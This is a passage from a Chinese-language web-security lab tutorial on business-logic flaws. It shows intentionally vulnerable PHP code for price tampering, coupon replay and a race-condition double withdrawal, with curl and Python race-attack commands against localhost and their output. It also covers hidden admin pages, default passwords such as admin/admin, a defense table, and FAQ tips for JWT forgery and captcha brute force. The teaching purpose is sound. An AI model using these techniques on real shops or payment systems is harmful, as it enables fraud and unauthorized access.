> 靶场把"订单接受"当终点；真实业务的负数订单后面还有支付网关的金额核对、发货前的复核——打真实目标时，改价是否成立要看全流程，别看到订单生成就收工。反向的坑也存在：服务端若用 `intval()` 一类取整接收，`-0.5` 会被向零截断成 `0`，总价反而没变（见 [[#8. 常见问题|常见问题表]]）。

### 5.2 总价只信前端

把总价也交给客户端的版本：

```php
<?php
// checkout_client.php —— 总价由客户端提交，服务端只做记录
$price = $_POST['price'] ?? '';
$qty   = $_POST['qty'] ?? '';
$total = $_POST['total'] ?? '';      // 缺陷：总价信前端
printf("order placed: price=%s qty=%s => payable=%s\n", $price, $qty, $total);
```

```bash
curl -s --noproxy '*' -d 'price=100&qty=1&total=0.01' http://127.0.0.1:9305/checkout_client.php
```

输出：

```
order placed: price=100 qty=1 => payable=0.01
```

百元的商品一分钱成交。这就是 [[W03-信息泄露与前端安全#6.2 靶场：带三道前端限制的注册表单|W03 6.2]] 那个被改掉的 `role` 字段在支付场景的名字：==凡是"页面算了什么就提交什么"的字段，服务端都要按自己的数据重算一遍==。正确形状：请求只带商品 id 与数量，价格、总价全部由服务端查库计算。

### 5.3 优惠券重放

规则是"每用户限用一次"，实现里没有任何使用记录：

```php
<?php
// coupon.php —— 优惠券核销：规则是"每用户限用一次"，实现里没有记录
session_start();
$total = (float)($_POST['total'] ?? 0);
$code  = $_POST['coupon'] ?? '';
if ($code !== 'FREE100') { echo "invalid coupon\n"; exit; }
// 缺陷：没有在 session（或数据库）里记录"已核销"，同一张券可以反复减
$total -= 100;
$_SESSION['payable'] = $total;
printf("coupon applied: -100, payable = %s\n", var_export($total, true));
```

```bash
curl -s --noproxy '*' -c cp.jar -d 'total=150&coupon=FREE100' http://127.0.0.1:9305/coupon.php
curl -s --noproxy '*' -b cp.jar -d 'total=150&coupon=FREE100' http://127.0.0.1:9305/coupon.php
```

输出：

```
coupon applied: -100, payable = 50.0
coupon applied: -100, payable = 50.0
```

两次核销都成功，一张券减了两次。这一型的家族成员全是"只能一次"的规则：抽奖次数、签到奖励、邀请返现、投票——==规则里每写一个"一次"，实现里就要有一个落库的一次性标记==，且标记写入与利益发放要在同一个原子操作里。

### 5.4 竞态重复提现

余额 100，提现接口的检查与扣款是两个动作：

```php
<?php
// withdraw.php —— 提现：检查余额与扣款之间存在一段间隙
session_start();
if (isset($_GET['reset'])) { $_SESSION['balance'] = 100; session_write_close(); echo "balance reset to 100\n"; exit; }
if (isset($_GET['show']))  { echo 'balance = ' . ($_SESSION['balance'] ?? 0) . "\n"; exit; }
$amt = (float)($_POST['amount'] ?? 0);
$bal = $_SESSION['balance'] ?? 0;
if ($bal >= $amt) {
    session_write_close();   // 释放会话锁：此后其他请求可以同时进来（真实应用读库后同样有这段间隙）
    usleep(300000);          // 模拟"检查之后、扣款之前"的业务耗时
    session_start();
    $_SESSION['balance'] -= $amt;
    printf("withdraw ok: -%s, balance=%s\n", var_export($amt, true), $_SESSION['balance']);
    session_write_close();
} else {
    printf("insufficient: balance=%s, want=%s\n", $bal, var_export($amt, true));
}
```

检查通过到扣款完成之间有 0.3 秒的间隙，期间的并发请求读到的余额**都还是 100**，于是都能通过检查。打法就是 [[W07-文件上传#8. 条件竞争：先保存再删除的窗口|W07 第 8 节]]的条件竞争：多个线程把请求对齐到同一瞬间发出。靶场把余额放在 session 里，PHP 的会话锁本会串行化同一会话的请求，所以漏洞代码先 `session_write_close()` 把锁放掉——真实应用余额在数据库，本来就没有这把锁，间隙天然存在，`usleep` 只是把它拉宽到肉眼可见：

```python
# race_withdraw.py —— 竞态重复提现：8 个线程同一瞬间各提 100，余额只有 100（节选）
s = requests.Session()
print(s.get(BASE + '?reset=1').text.strip())
sid = s.cookies.get('PHPSESSID')
HDR = {'Cookie': f'PHPSESSID={sid}'}
barrier = threading.Barrier(THREADS)          # 8 个线程对齐到同一瞬间
def worker():
    barrier.wait()
    r = requests.post(BASE, data={'amount': 100}, headers=HDR, timeout=10)
    results.append(r.text.strip())
```

```bash
python3 race_withdraw.py
```

输出：

```
balance reset to 100
0.31s
  insufficient: balance=-300, want=100.0
  insufficient: balance=-400, want=100.0
  insufficient: balance=-400, want=100.0
  withdraw ok: -100.0, balance=-100
  withdraw ok: -100.0, balance=-200
  withdraw ok: -100.0, balance=-300
  withdraw ok: -100.0, balance=-400
  withdraw ok: -100.0, balance=0
final: balance = -400
```

8 个请求 5 个通过检查，100 元余额被提走 500 元。修复把"检查"与"扣款"焊成一个原子动作：数据库原子扣减 `UPDATE accounts SET balance = balance - :amt WHERE id = :id AND balance >= :amt`（一条语句里同时完成检查与扣减，影响行数为 0 即余额不足），配合幂等键（同一业务单号只处理一次）与必要的锁。==凡是"检查 A、然后做 B"两段式的钱相关逻辑，都要先问一句：这两段之间，别人能插进来吗==。

## 6. 未授权访问与隐藏入口

前端路由的"权限控制"——按角色渲染菜单、路由守卫拦跳转——全都发生在浏览器里，[[W03-信息泄露与前端安全#6.1 校验发生在谁的机器上|W03 6.1]] 已经给过结论。API 层不做检查的话，藏起来的入口照样直通。越权靶把形状做全了：`index.php` 的导航里没有管理入口，`admin.html` 这个管理页不存在于任何链接里——robots.txt 里倒是写着：

```bash
curl -s --noproxy '*' http://127.0.0.1:9300/robots.txt
curl -s --noproxy '*' http://127.0.0.1:9300/admin.html
```

输出：

```
User-agent: *
Disallow: /admin.html
Disallow: /api/
```

```
<!DOCTYPE html>
<!-- admin.html —— 管理后台：不出现在任何导航里，"藏起来"就是它全部的防护 -->
<html>
<head><title>管理后台</title></head>
<body>
<h2>运营管理后台</h2>
<div id="stats">加载中……</div>
<script>
fetch('/api/admin/stats.php')
  .then(r => r.text())
  .then(t => { document.getElementById('stats').textContent = t; });
</script>
</body>
</html>
```

页面 JS 调的 `/api/admin/stats.php`，正是 2.2 里 alice 已经拿走过 flag 的那个接口。==藏起来的入口不是不存在的入口==，而 robots.txt 的 Disallow 反而是路标——[[11-Web安全版图与Burp#3.1 信息泄露：flag 躺在你看得见的地方|11 章 3.1]] 与 [[W03-信息泄露与前端安全#1.4 常见敏感路径与字典思路|W03 1.4]] 的收集动作（robots、目录爆破、JS 翻找）在这里原样复用。

两类"被照常使用就算沦陷"的入口，测站时各值一轮零成本的尝试：

- **默认口令**：设备与后台的出厂组合（admin/admin、admin/123456、root/root 一类）——它们排在任何字典的前几行，新装系统没改默认口令至今是常见事件；
- **调试与文档接口忘在站上**：phpinfo.php、swagger/openapi 文档页、框架与中间件自带的监控台。它们不是被攻破的，是照着说明书被使用的；文档接口还常把内部路由与参数结构一次交清，给后续测试递图。

CTF 里这条线的常见连法：信息收集找到后台（[[W03-信息泄露与前端安全|W03]]）→ 弱口令或未授权进入 → 后台自带的上传、模板编辑功能接 [[W07-文件上传|W07]] 或 [[W09-SSTI|W09]] 的打法——后台不是终点，是更高一级的跳板。

## 7. 防御

按本章各节的洞倒排一张清单，每条对应"洞在哪、补什么"：

| 洞 | 防御 | 关键动作 |
| ---- | ---- | ---- |
| 未授权访问（第 6 节） | 统一鉴权，默认拒绝 | 认证与角色检查放统一入口（中间件/网关），路由显式声明所需角色，未声明的一律拒绝 |
| 垂直越权（2.2） | 角色检查独立于登录 | 管理类接口逐个声明角色，"登录了"不等于"都能用" |
| 水平越权（2.2） | 归属校验进查询 | 对象编号永远与身份一起查：`WHERE owner = :session_user`，不靠"ID 难猜" |
| alg=none / 混淆（3.2、3.4） | JWT 最小信任 | 算法白名单写死在服务端配置；密钥高熵且不与公开材料共用；exp/iss/aud 全查；header 里的密钥指向一律忽略 |
| 弱密钥（3.3） | 密钥管理 | `random_bytes` 生成、定期轮换、不进代码库 |
| 验证码四缺陷（第 4 节） | 服务端校验 + 一次性 + 限速 | 校验在服务端；用后即毁；限速与总量上限；响应不回显答案 |
| 参数改价（5.1、5.2） | 金额服务端算 | 请求只带商品 id 与数量，价格总价服务端查库计算；整数分或 decimal；负数与超大值设界 |
| 优惠券重放（5.3） | 一次性规则落库 | "已使用"有记录、与利益发放同事务，数据库唯一约束兜底 |
| 竞态提现（5.4） | 原子化 | 原子 UPDATE、幂等键、必要时加锁——检查与变更不分两段 |

九条形状相同：==不把"客户端没做坏事"当前提，每个请求都在服务端重新问一遍——你是谁、这是什么、允许吗、允许几次==。[[W03-信息泄露与前端安全#6. 前端校验绕过|W03 第 6 节]]那句话在逻辑层再说一遍：校验发生在服务端，全部，每次。

## 8. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| 改了 payload 服务端不认，报 bad signature | 只改了内容、没动签名，HS256 验签必拒（3.2 的 tamper 就是它）：要么让服务端接受 none（[[#3.2 alg=none：让验签消失\|3.2]]），要么拿到密钥重签（3.3/3.4） |
| alg=none 打过去报 unsupported alg | 那台靶只认 HS256：三台靶各留一个洞，先分清靶子漏的是哪一种（[[#3.1 攻击面与三台靶\|3.1]]） |
| 爆破出的密钥签名对不上 | 字典行尾的 `\r` 或空格没去掉：逐行 `strip()`；密钥传 str 还是 bytes 也要对齐（[[#3.3 HS256 弱密钥：离线爆破\|3.3]]） |
| 混淆攻击报 bad signature | HMAC 密钥必须是公钥文件的完整原样字节（含 BEGIN/END 行与换行），不是抠出来的 base64 段（[[#3.4 RS256/HS256 混淆：公钥当 HMAC 密钥\|3.4]]） |
| 验证码复用不成立 | 两次请求没带同一份 cookie：`-c` 存、`-b` 带要配对，session 不同则验证码各是各的（[[#4.3 缺陷二：不销毁，可复用\|4.3]]） |
| 空值绕过失败 | 靶子在比较前 `isset` 检查了会话验证码，弱比较的前提不存在：先确认靶子是哪一种写法再选打法（[[#4.5 缺陷四：空值与弱比较\|4.5]]） |
| 短信爆破跑一半就停 | 命中了：回输出里找 flag 行；或 PHP 会话过期（默认 1440 秒不活动回收），重取会话再跑 |
| 负数价格没让总价变负 | 服务端用 `intval()` 一类取整接收：小数向零截断（`intval(-0.5)` 是 `0`），总价纹丝不动——改发整数负值如 `-80`，这类转换拦不住整数（[[#5.1 金额与数量：负数、超大数、浮点\|5.1]]） |
| 竞态没有重复成功 | php -S 没开多 worker（默认单进程串行，请求排队就抢不到窗口）：`PHP_CLI_SERVER_WORKERS` 与线程数都要给够（[[#5.4 竞态重复提现\|5.4]]） |
| 优惠券第二次核销失败 | 靶子补了使用记录——这不是故障，是第 7 节防御生效的样子 |
| 管理接口回 401 而不是 403 | 会话没带上（根本没登录）：401 是认证问题，403 才是授权问题，排越权前先确认 cookie 在（[[#2.2 靶场：三个只查登录的接口\|2.2]]） |
| token 签名没问题还是 401 | 服务端检查了 `exp`/`iss`/`aud`：伪造 payload 时把这些声明一并带上、时间戳写到未来（3.2/3.3 的 forge 脚本都写了 exp） |
